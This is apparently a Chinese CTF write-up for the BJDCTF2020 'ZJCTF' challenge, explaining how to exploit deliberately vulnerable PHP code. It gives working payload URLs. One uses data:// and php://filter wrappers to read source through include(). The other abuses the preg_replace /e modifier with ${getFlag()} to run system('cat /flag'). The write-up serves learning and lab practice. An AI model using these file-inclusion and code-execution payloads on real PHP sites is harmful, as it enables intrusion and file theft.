# [BJDCTF2020]ZJCTF，不过如此

[题目地址](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)

为什么BJDCTF说ZJCTF不行？

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

简单的一个伪协议。直接构造payload读取注释里提到的next.php文件。

- http://df8bd0fd-28f8-41c2-86dc-0c3da495b1ce.node4.buuoj.cn:81/?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&file=php://filter/read=convert.base64-encode/resource=next.php

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

之前见过preg_replace加上/e选项导致的[命令执行](https://xz.aliyun.com/t/2557)。这个选项会使 preg_replace() 将 replacement 参数当作 PHP 代码（在替换完成之后）执行。要确保  replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。问题是这道题的replacement（第二个参数）不是我们能够控制的，此时该如何构造payload呢？

上面给的链接其实已经给出答案了，这题感觉出题人灵感就是从那来的。我们虽然不能控制replacement，但是第一个参数可以控制。结合下面的foreach语句，第一个参数是get传参时的参数名，第三个参数是参数内容。这题肯定是尝试调用getFlag参数。构造payload。

- http://df8bd0fd-28f8-41c2-86dc-0c3da495b1ce.node4.buuoj.cn:81/next.php?\S*=${getFlag()}&cmd=system(%22cat%20/flag%22);

参数名为`\S*`，内容为`${getFlag()}`。`\S*`中的`\S`表示匹配任何非空白字符，`*`表示匹配零个或多个。这倒是不难，可是为什么值是`${getFlag()}`而不是直接`getFlag()`呢？因为第二个参数固定为`strtolower("\\1")`，也就是`\\1`的小写。`\\1`就是1，转义罢了，然而`\1`好像更不知道有什么用了。其实`\1`在正则表达式中有自己的含义，表示反向引用。

- 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。

所以`\1`代表第一个子匹配项。[${}](https://www.php.net/manual/zh/language.variables.variable.php)和php的可变变量有关。直接传`getFlag()`，确实能够执行，但是程序回显的地方只有`echo complex($re, $str). "\n";`，也就是preg_replace的返回值：替换后的内容。那getFlag就被原封不动返回来了，看不到执行效果。`${getFlag()}`把getFlag看作参数，先执行getFlag获取其返回值，这样`/1`取到的就是函数执行的结果了。